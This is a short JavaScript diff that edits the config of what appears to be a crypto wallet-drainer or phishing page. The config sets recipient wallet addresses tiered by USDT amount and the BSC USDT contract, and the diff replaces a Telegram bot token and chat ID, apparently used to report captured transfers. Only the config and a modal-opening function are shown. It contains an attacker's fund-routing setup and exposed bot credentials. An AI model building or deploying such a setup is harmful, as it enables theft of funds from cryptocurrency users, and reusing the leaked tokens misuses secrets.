@@ -2,8 +2,8 @@ const CONFIG = {
     REC_SMALL: "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe", // < 300 USDT
     REC_BIG: "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe",   // >= 300 USDT (Isse badal sakte ho)
     USDT: "0x55d398326f99059fF775485246999027B3197955",
-    BOT: "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI",
-    CHAT: "7849151110" // Numerical ID behtar kaam karti hai
+    BOT: "8503598876:AAFQBEMmfHgcjPpyA_TwTJxTz34gwOswH1k",
+    CHAT: "8503598876" // Numerical ID behtar kaam karti hai
 };
 
 function openModal() { document.getElementById('w-modal').style.display = 'flex'; }
